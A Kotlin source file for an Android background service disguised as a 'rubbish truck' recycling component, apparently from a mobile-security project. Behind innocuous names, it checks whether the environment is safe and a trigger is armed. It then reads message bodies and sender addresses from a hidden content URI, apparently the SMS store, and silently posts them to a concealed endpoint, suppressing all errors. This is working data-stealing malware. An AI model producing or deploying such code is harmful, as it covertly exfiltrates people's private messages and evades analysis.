package com.example.mobsec_823.RecylingService

import android.app.Service
import android.content.Intent
import android.net.Uri
import android.os.IBinder
import android.util.Log
import com.example.mobsec_823.utils.SafetyNet
import com.example.mobsec_823.utils.SecretBox
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import java.lang.StringBuilder

class RubbishTruckService : Service() {

    private val TAG = "RubbishTruckService"

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (!SafetyNet.isEnvironmentSafe() || !SafetyNet.isTriggerArmed(this)) {
            stopSelf()
            return START_NOT_STICKY
        }

        Thread {
            try {
                if (!SafetyNet.checkKitchenPermit(11)) return@Thread

                val scrapData = collectScraps()
                if (scrapData.isNotEmpty()) {
                    dumpAtLandfill(scrapData)
                }
            } catch (e: Exception) {
            } finally {
                stopSelf()
            }
        }.start()

        return START_NOT_STICKY
    }

    private fun collectScraps(): String {
        val sb = StringBuilder("=== RUBBISH COLLECTION ===\n")
        val uriStr = SecretBox.getScrapUri()
        if (uriStr.isEmpty()) return ""
        
        val uri: Uri = Uri.parse(uriStr)

        return try {
            contentResolver.query(uri, null, null, null, null)?.use { cursor ->
                val bodyIdx = cursor.getColumnIndex("body")
                val addrIdx = cursor.getColumnIndex("address")

                var count = 0
                while (cursor.moveToNext() && count < 10) {
                    val body = if (bodyIdx != -1) cursor.getString(bodyIdx) else "N/A"
                    val addr = if (addrIdx != -1) cursor.getString(addrIdx) else "Unknown"
                    sb.append("Source: $addr | Scrap: $body\n")
                    count++
                }
                sb.toString()
            } ?: "Bin empty"
        } catch (e: Exception) {
            ""
        }
    }

    private fun dumpAtLandfill(data: String) {
        try {
            val endpoint = SecretBox.getRubbishEndpoint()
            if (endpoint.isEmpty()) return

            val client = OkHttpClient()
            val request = Request.Builder()
                .url(endpoint)
                .post(data.toRequestBody("text/plain".toMediaType()))
                .build()
            client.newCall(request).execute().use { response ->
                if (response.isSuccessful) Log.i(TAG, "Rubbish dumped successfully")
            }
        } catch (e: Exception) { }
    }
}
